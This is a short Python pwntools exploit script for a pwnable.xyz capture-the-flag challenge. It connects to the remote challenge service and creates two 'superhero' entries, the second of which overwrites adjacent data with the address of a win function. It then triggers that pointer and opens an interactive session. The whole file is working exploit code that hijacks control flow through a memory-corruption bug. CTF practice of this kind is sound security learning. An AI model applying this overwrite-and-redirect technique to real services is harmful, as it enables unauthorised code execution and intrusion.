from pwn import *

#s = process("./challenge")
s = remote("svc.pwnable.xyz",30032)

win = 0x400A33

def create(length,name,skill):
	s.recvuntil("> ")
	s.sendline("1")
	s.recvuntil("How long do you want your superhero's name to be? ")
	s.sendline(str(length))
	s.recvuntil("Great! Please enter your hero's name: ")
	s.sendline(name)
	s.recvuntil("> ")
	s.sendline(str(skill))

create(100,"A"*99,1)
create(100,"A"*7+p64(win),6)

s.recvuntil("> ")
s.sendline("2")

s.interactive()
